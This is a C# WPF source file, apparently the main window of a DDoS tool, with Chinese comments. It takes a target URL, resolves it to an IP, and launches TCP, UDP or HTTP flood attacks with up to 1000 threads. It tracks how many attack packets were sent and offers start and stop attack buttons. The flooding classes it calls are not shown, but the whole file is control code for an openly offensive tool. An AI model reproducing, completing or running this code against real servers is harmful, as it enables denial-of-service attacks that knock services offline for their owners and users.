using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Ddos
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class FormMain : Window
    {
        private int threadsNum = 0;
        private long attackNum = 0;
        private HttpFlooder httpFlooder;  //声明一个员工http攻击者
        private XXPFlooder xxpFlooder;  //声明一个员工XXP攻击者
        private bool isAttacking = false;
        private int whichWorking;

        public FormMain()
        {
            InitializeComponent();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            string text = this.txtTargetURL.Text.ToLower();
            if (text.Length == 0)
            {
                MessageBox.Show("What the shit.");
                return;
            }
            if (!text.StartsWith("http://") && !text.StartsWith("https://"))
            {
                text = "http://" + text;
            }
            try
            {
                IPAddress[] addressList = Dns.GetHostEntry(new Uri(text).Host).AddressList;
                this.txtTarget.Text = ((addressList.Length > 1) ? addressList[new Random().Next(addressList.Length)] : addressList.First<IPAddress>()).ToString();
            }
            catch
            {
                MessageBox.Show("What the shit.");
            }
        }

        private void attackedNum_Changed(params object[] objs)
        {
            this.attackNum++;
            this.Dispatcher.Invoke(new Action(() =>
            {
                this.attackedNum.Content = this.attackNum.ToString();
            }));
            
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            //检查客户必须提供的资料是否齐全
            if (!this.check())
            {
                return;
            }

            if (!this.isAttacking)
            {
                this.isAttacking = true;
                this.attack.Content = "停止攻击";

                this.attackNum = 0;
                this.attackedNum.Content = "0";//清零已攻击次数
                int attackType = this.attackType.SelectedIndex;
                //判断客户选择的攻击方式
                switch (attackType)
                {
                    case 0://TCP
                        this.xxpFlooder = new XXPFlooder();
                        this.xxpFlooder.Ip = this.txtTarget.Text;
                        this.xxpFlooder.Port = Convert.ToInt32(this.port.Text);
                        this.xxpFlooder.Protocol = 1;
                        this.xxpFlooder.Delay = Convert.ToInt32(this.delay.Text);
                        this.xxpFlooder.Resp = this.resp.IsChecked == true ? true : false;
                        this.xxpFlooder.Data = this.data.Text;
                        this.xxpFlooder.ThreadNum = Convert.ToInt32(this.threadNum.Text);
                        this.xxpFlooder.attackedNum_Changed = new DdosEventHandler(this.attackedNum_Changed);
                        this.xxpFlooder.threadingNum_Changed = new DdosEventHandler(this.threadingNum_Changed);
                        this.xxpFlooder.Start();
                        this.whichWorking = 2; 
                        break;
                    case 1://UDP
                        this.xxpFlooder = new XXPFlooder();
                        this.xxpFlooder.Ip = this.txtTarget.Text;
                        this.xxpFlooder.Port = Convert.ToInt32(this.port.Text);
                        this.xxpFlooder.Protocol = 2;
                        this.xxpFlooder.Delay = Convert.ToInt32(this.delay.Text);
                        this.xxpFlooder.Resp = this.resp.IsChecked == true ? true : false;
                        this.xxpFlooder.Data = this.data.Text;
                        this.xxpFlooder.ThreadNum = Convert.ToInt32(this.threadNum.Text);
                        this.xxpFlooder.attackedNum_Changed = new DdosEventHandler(this.attackedNum_Changed);
                        this.xxpFlooder.threadingNum_Changed = new DdosEventHandler(this.threadingNum_Changed);
                        this.xxpFlooder.Start();
                        this.whichWorking = 2; 
                        break;
                    case 2://HTTP
                        //马上聘用此http攻击者
                        this.httpFlooder = new HttpFlooder();
                        //给攻击者传达已知资料
                        this.httpFlooder.Ip = this.txtTarget.Text;
                        this.httpFlooder.Port = Convert.ToInt32(this.port.Text);
                        this.httpFlooder.SubSite = this.subSite.Text;
                        this.httpFlooder.Resp = this.resp.IsChecked == true ? true : false;
                        this.httpFlooder.Delay = Convert.ToInt32(this.delay.Text);
                        this.httpFlooder.Timeout = Convert.ToInt32(this.timeOut.Text);
                        this.httpFlooder.ThreadNum = Convert.ToInt32(this.threadNum.Text);
                        //给此攻击者交代反馈任务
                        this.httpFlooder.attackedNum_Changed = new DdosEventHandler(this.attackedNum_Changed);
                        this.httpFlooder.threadingNum_Changed = new DdosEventHandler(this.threadingNum_Changed);
                        //命令攻击者开始工作
                        this.httpFlooder.Start();
                        this.whichWorking = 1; //告诉自己员工1（http）正在工作，员工2（xxp）休息
                        break;
                    default:
                        break;
                }

            }
            else
            {
                this.isAttacking = false;
                if (this.whichWorking == 1)
                {
                    this.httpFlooder.Stop();
                }
                else
                {
                    this.xxpFlooder.Stop();
                }
                this.attack.Content = "开始攻击";
            }
            
            
        }

        private bool check() {
            if (this.txtTarget.Text == string.Empty)
            {
                MessageBox.Show("目标IP不能为空");
                return false;
            }

            int a;
            if (!int.TryParse(this.timeOut.Text,out a))
            {

                MessageBox.Show("超时时间填写有误");
                return false;
            }else{
                if (a<100)
	            {
                    MessageBox.Show("超时时间太小");
                    return false;
	            }
            }

            if (this.port.Text == string.Empty)
            {
                MessageBox.Show("请填写端口");
                return false;
            }

            int b;
            if (!int.TryParse(this.threadNum.Text, out b))
            {

                MessageBox.Show("线程数填写有误");
                return false;
            }
            else
            {
                if (b > 1000)
                {
                    MessageBox.Show("线程数不能超过1000");
                    return false;
                }
            }

            int c;
            if (!int.TryParse(this.timeOut.Text, out c))
            {

                MessageBox.Show("攻击速度填写有误");
                return false;
            }

            return true;
        }

        private void threadingNum_Changed(params object[] objects)
        {
            int a = (int)objects[0];
            this.Dispatcher.Invoke(new Action(() =>
            {
                if (a == 1)
                {
                    this.threadsNum++;
                }
                else {
                    this.threadsNum--;
                    if (this.threadsNum == 0 && this.isAttacking == true)
                    {
                        MessageBox.Show("攻击已自动停止，您的配置可能有误", "错误", MessageBoxButton.OK, MessageBoxImage.Error);
                        this.isAttacking = false;
                        if (this.whichWorking == 1)
                        {
                            this.httpFlooder.Stop();
                        }
                        else
                        {
                            this.xxpFlooder.Stop();
                        }
                        this.attack.Content = "开始攻击";
                    }
                }
                this.threadingNum.Content = this.threadsNum.ToString();
            }));
        }

        private void Window_Closed(object sender, EventArgs e)
        {
            //此处必须要，否则主程序退出时，其他线程还在执行
            Environment.Exit(0);
        }

    }
}
